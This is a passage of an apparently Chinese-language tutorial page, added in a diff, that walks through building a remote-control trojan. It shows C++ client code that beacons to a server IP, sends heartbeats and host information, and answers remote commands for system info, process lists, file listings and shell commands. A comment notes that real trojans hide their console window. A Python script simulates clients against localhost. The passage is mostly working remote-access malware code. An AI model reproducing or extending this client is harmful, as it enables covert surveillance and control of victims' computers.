+<span class="line"><span style="color:#B392F0">        sprintf_s</span><span style="color:#E1E4E8">(buf, </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%-15lu</span><span style="color:#79B8FF"> %-10s</span><span style="color:#79B8FF"> %s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">            findData.dwFileAttributes,</span></span>
+<span class="line"><span style="color:#E1E4E8">            sizeStr,</span></span>
+<span class="line"><span style="color:#E1E4E8">            findData.cFileName);</span></span>
+<span class="line"><span style="color:#E1E4E8">        result </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> buf;</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">while</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">FindNextFileA</span><span style="color:#E1E4E8">(hFind, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">findData));</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    FindClose</span><span style="color:#E1E4E8">(hFind);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> result;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 心跳线程</span></span>
+<span class="line"><span style="color:#E1E4E8">DWORD WINAPI </span><span style="color:#B392F0">HeartbeatThread</span><span style="color:#E1E4E8">(LPVOID param) {</span></span>
+<span class="line"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (g_sock </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> INVALID_SOCKET) {</span></span>
+<span class="line"><span style="color:#B392F0">        Sleep</span><span style="color:#E1E4E8">(HEARTBEAT_INTERVAL);</span></span>
+<span class="line"><span style="color:#B392F0">        SendResponse</span><span style="color:#E1E4E8">(CMD_HEARTBEAT, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 连接服务器</span></span>
+<span class="line"><span style="color:#F97583">bool</span><span style="color:#B392F0"> ConnectToServer</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#E1E4E8">    g_sock </span><span style="color:#F97583">=</span><span style="color:#B392F0"> socket</span><span style="color:#E1E4E8">(AF_INET, SOCK_STREAM, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (g_sock </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_SOCKET) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    sockaddr_in serverAddr </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">    serverAddr.sin_family </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> AF_INET;</span></span>
+<span class="line"><span style="color:#E1E4E8">    serverAddr.sin_port </span><span style="color:#F97583">=</span><span style="color:#B392F0"> htons</span><span style="color:#E1E4E8">(SERVER_PORT);</span></span>
+<span class="line"><span style="color:#B392F0">    inet_pton</span><span style="color:#E1E4E8">(AF_INET, SERVER_IP, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">serverAddr.sin_addr);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">connect</span><span style="color:#E1E4E8">(g_sock, (sockaddr</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">serverAddr, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(serverAddr)) </span><span style="color:#F97583">!=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">        closesocket</span><span style="color:#E1E4E8">(g_sock);</span></span>
+<span class="line"><span style="color:#E1E4E8">        g_sock </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> INVALID_SOCKET;</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 发送上线包</span></span>
+<span class="line"><span style="color:#F97583">bool</span><span style="color:#B392F0"> SendOnline</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#E1E4E8">    ONLINE_INFO info;</span></span>
+<span class="line"><span style="color:#B392F0">    GetOnlineInfo</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">info);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#B392F0"> SendResponse</span><span style="color:#E1E4E8">(CMD_ONLINE, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">info, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(info));</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 处理Shell命令（简化版）</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> HandleShellCommand</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#B392F0"> std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#F97583">&#x26;</span><span style="color:#FFAB70"> command</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">    // 简化实现，实际应该创建cmd进程并重定向IO</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::string output </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "Command executed: "</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> command </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> "</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">    SendResponse</span><span style="color:#E1E4E8">(CMD_SHELL_OUTPUT, output.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), (DWORD)output.</span><span style="color:#B392F0">length</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 主循环</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> MainLoop</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#6A737D">    // 启动心跳</span></span>
+<span class="line"><span style="color:#B392F0">    CreateThread</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, HeartbeatThread, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 接收命令</span></span>
+<span class="line"><span style="color:#E1E4E8">        MSG_HEADER header;</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> n </span><span style="color:#F97583">=</span><span style="color:#B392F0"> recv</span><span style="color:#E1E4E8">(g_sock, (</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">header, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(header), </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (n </span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (header.magic </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> MAGIC_NUMBER) </span><span style="color:#F97583">continue</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 接收数据</span></span>
+<span class="line"><span style="color:#B392F0">        std</span><span style="color:#E1E4E8">::vector</span><span style="color:#F97583">&#x3C;char></span><span style="color:#B392F0"> data</span><span style="color:#E1E4E8">(header.dataLen);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (header.dataLen </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">recv</span><span style="color:#E1E4E8">(g_sock, data.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">(), header.dataLen, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 处理命令</span></span>
+<span class="line"><span style="color:#F97583">        switch</span><span style="color:#E1E4E8"> (header.cmdType) {</span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#E1E4E8"> CMD_ONLINE:</span></span>
+<span class="line"><span style="color:#E1E4E8">                g_clientId </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> header.clientId;</span></span>
+<span class="line"><span style="color:#F97583">                break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#E1E4E8"> CMD_SYSINFO: {</span></span>
+<span class="line"><span style="color:#B392F0">                std</span><span style="color:#E1E4E8">::string info </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetSystemInfo</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">                SendResponse</span><span style="color:#E1E4E8">(CMD_SYSINFO, info.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), (DWORD)info.</span><span style="color:#B392F0">size</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#F97583">                break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#E1E4E8"> CMD_PROCLIST: {</span></span>
+<span class="line"><span style="color:#B392F0">                std</span><span style="color:#E1E4E8">::string procs </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetProcessList</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">                SendResponse</span><span style="color:#E1E4E8">(CMD_PROCLIST, procs.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), (DWORD)procs.</span><span style="color:#B392F0">size</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#F97583">                break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#E1E4E8"> CMD_FILELIST: {</span></span>
+<span class="line"><span style="color:#B392F0">                std</span><span style="color:#E1E4E8">::string </span><span style="color:#B392F0">path</span><span style="color:#E1E4E8">(data.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">(), header.dataLen);</span></span>
+<span class="line"><span style="color:#B392F0">                std</span><span style="color:#E1E4E8">::string files </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetFileList</span><span style="color:#E1E4E8">(path.</span><span style="color:#B392F0">empty</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">?</span><span style="color:#9ECBFF"> "C:</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">"</span><span style="color:#F97583"> :</span><span style="color:#E1E4E8"> path);</span></span>
+<span class="line"><span style="color:#B392F0">                SendResponse</span><span style="color:#E1E4E8">(CMD_FILELIST, files.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), (DWORD)files.</span><span style="color:#B392F0">size</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#F97583">                break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            case</span><span style="color:#E1E4E8"> CMD_SHELL: {</span></span>
+<span class="line"><span style="color:#B392F0">                std</span><span style="color:#E1E4E8">::string </span><span style="color:#B392F0">cmd</span><span style="color:#E1E4E8">(data.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">(), header.dataLen);</span></span>
+<span class="line"><span style="color:#B392F0">                HandleShellCommand</span><span style="color:#E1E4E8">(cmd);</span></span>
+<span class="line"><span style="color:#F97583">                break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">int</span><span style="color:#B392F0"> main</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#6A737D">    // 隐藏控制台窗口（实际木马会这样做）</span></span>
+<span class="line"><span style="color:#6A737D">    // ShowWindow(GetConsoleWindow(), SW_HIDE);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    WSADATA wsa;</span></span>
+<span class="line"><span style="color:#B392F0">    WSAStartup</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">MAKEWORD</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">wsa);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Remote control client starting...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 持续尝试连接</span></span>
+<span class="line"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">ConnectToServer</span><span style="color:#E1E4E8">()) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Connected to server</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">SendOnline</span><span style="color:#E1E4E8">()) {</span></span>
+<span class="line"><span style="color:#B392F0">                printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Online packet sent</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">                MainLoop</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#B392F0">            closesocket</span><span style="color:#E1E4E8">(g_sock);</span></span>
+<span class="line"><span style="color:#E1E4E8">            g_sock </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> INVALID_SOCKET;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        Sleep</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">5000</span><span style="color:#E1E4E8">);</span><span style="color:#6A737D">  // 5秒后重连</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    WSACleanup</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h3 id="section-9">3. 系统测试脚本</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">#!/usr/bin/env python3</span></span>
+<span class="line"><span style="color:#6A737D"># test_system.py</span></span>
+<span class="line"><span style="color:#6A737D"># 远程控制系统测试脚本</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> socket</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> threading</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> time</span></span>
+<span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> struct</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79B8FF">MAGIC_NUMBER</span><span style="color:#F97583"> =</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">52415400</span></span>
+<span class="line"><span style="color:#79B8FF">SERVER_PORT</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> 8888</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> TestClient</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#F97583">    def</span><span style="color:#79B8FF"> __init__</span><span style="color:#E1E4E8">(self, client_id):</span></span>
+<span class="line"><span style="color:#79B8FF">        self</span><span style="color:#E1E4E8">.client_id </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> client_id</span></span>
+<span class="line"><span style="color:#79B8FF">        self</span><span style="color:#E1E4E8">.sock </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> None</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">    def</span><span style="color:#B392F0"> connect</span><span style="color:#E1E4E8">(self):</span></span>
+<span class="line"><span style="color:#F97583">        try</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">            self</span><span style="color:#E1E4E8">.sock </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> socket.socket(socket.</span><span style="color:#79B8FF">AF_INET</span><span style="color:#E1E4E8">, socket.</span><span style="color:#79B8FF">SOCK_STREAM</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">            self</span><span style="color:#E1E4E8">.sock.connect((</span><span style="color:#9ECBFF">'127.0.0.1'</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">SERVER_PORT</span><span style="color:#E1E4E8">))</span></span>
+<span class="line"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[Client </span><span style="color:#79B8FF">{self</span><span style="color:#E1E4E8">.client_id</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">] Connected to server"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> True</span></span>
+<span class="line"><span style="color:#F97583">        except</span><span style="color:#79B8FF"> Exception</span><span style="color:#F97583"> as</span><span style="color:#E1E4E8"> e:</span></span>
+<span class="line"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[Client </span><span style="color:#79B8FF">{self</span><span style="color:#E1E4E8">.client_id</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">] Connection failed: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">e</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> False</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    def</span><span style="color:#B392F0"> send_online</span><span style="color:#E1E4E8">(self):</span></span>
+<span class="line"><span style="color:#6A737D">        # 构造上线包</span></span>
+<span class="line"><span style="color:#E1E4E8">        header </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> struct.pack(</span><span style="color:#9ECBFF">'IIII'</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">MAGIC_NUMBER</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">256</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)  </span><span style="color:#6A737D"># CMD_ONLINE</span></span>
+<span class="line"><span style="color:#E1E4E8">        online_info </span><span style="color:#F97583">=</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'A'</span><span style="color:#F97583"> *</span><span style="color:#79B8FF"> 256</span><span style="color:#6A737D">  # 简化的上线信息</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        try</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">            self</span><span style="color:#E1E4E8">.sock.send(header </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> online_info)</span></span>
+<span class="line"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[Client </span><span style="color:#79B8FF">{self</span><span style="color:#E1E4E8">.client_id</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">] Sent online packet"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#6A737D">            # 接收确认</span></span>
+<span class="line"><span style="color:#E1E4E8">            response </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> self</span><span style="color:#E1E4E8">.sock.recv(</span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#79B8FF"> len</span><span style="color:#E1E4E8">(response) </span><span style="color:#F97583">>=</span><span style="color:#79B8FF"> 16</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#E1E4E8">                magic, cmd, data_len, client_id </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> struct.unpack(</span><span style="color:#9ECBFF">'IIII'</span><span style="color:#E1E4E8">, response)</span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> magic </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> MAGIC_NUMBER</span><span style="color:#F97583"> and</span><span style="color:#E1E4E8"> cmd </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">:  </span><span style="color:#6A737D"># CMD_ONLINE</span></span>
+<span class="line"><span style="color:#79B8FF">                    self</span><span style="color:#E1E4E8">.client_id </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> client_id</span></span>
+<span class="line"><span style="color:#79B8FF">                    print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[Client </span><span style="color:#79B8FF">{self</span><span style="color:#E1E4E8">.client_id</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">] Online confirmed"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">                    return</span><span style="color:#79B8FF"> True</span></span>
+<span class="line"><span style="color:#F97583">        except</span><span style="color:#79B8FF"> Exception</span><span style="color:#F97583"> as</span><span style="color:#E1E4E8"> e:</span></span>
+<span class="line"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[Client </span><span style="color:#79B8FF">{self</span><span style="color:#E1E4E8">.client_id</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">] Online failed: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">e</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> False</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    def</span><span style="color:#B392F0"> send_heartbeat</span><span style="color:#E1E4E8">(self):</span></span>
+<span class="line"><span style="color:#E1E4E8">        header </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> struct.pack(</span><span style="color:#9ECBFF">'IIII'</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">MAGIC_NUMBER</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">self</span><span style="color:#E1E4E8">.client_id)  </span><span style="color:#6A737D"># CMD_HEARTBEAT</span></span>
+<span class="line"><span style="color:#F97583">        try</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">            self</span><span style="color:#E1E4E8">.sock.send(header)</span></span>
+<span class="line"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[Client </span><span style="color:#79B8FF">{self</span><span style="color:#E1E4E8">.client_id</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">] Heartbeat sent"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">        except</span><span style="color:#79B8FF"> Exception</span><span style="color:#F97583"> as</span><span style="color:#E1E4E8"> e:</span></span>
+<span class="line"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[Client </span><span style="color:#79B8FF">{self</span><span style="color:#E1E4E8">.client_id</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">] Heartbeat failed: </span><span style="color:#79B8FF">{</span><span style="color:#E1E4E8">e</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    def</span><span style="color:#B392F0"> simulate_activity</span><span style="color:#E1E4E8">(self):</span></span>
+<span class="line"><span style="color:#6A737D">        # 模拟心跳</span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">):</span></span>
+<span class="line"><span style="color:#79B8FF">            self</span><span style="color:#E1E4E8">.send_heartbeat()</span></span>
+<span class="line"><span style="color:#E1E4E8">            time.sleep(</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        # 断开连接</span></span>
+<span class="line"><span style="color:#79B8FF">        self</span><span style="color:#E1E4E8">.sock.close()</span></span>
+<span class="line"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">f</span><span style="color:#9ECBFF">"[Client </span><span style="color:#79B8FF">{self</span><span style="color:#E1E4E8">.client_id</span><span style="color:#79B8FF">}</span><span style="color:#9ECBFF">] Disconnected"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> test_multiple_clients</span><span style="color:#E1E4E8">():</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== Testing Multiple Clients ==="</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    clients </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> []</span></span>
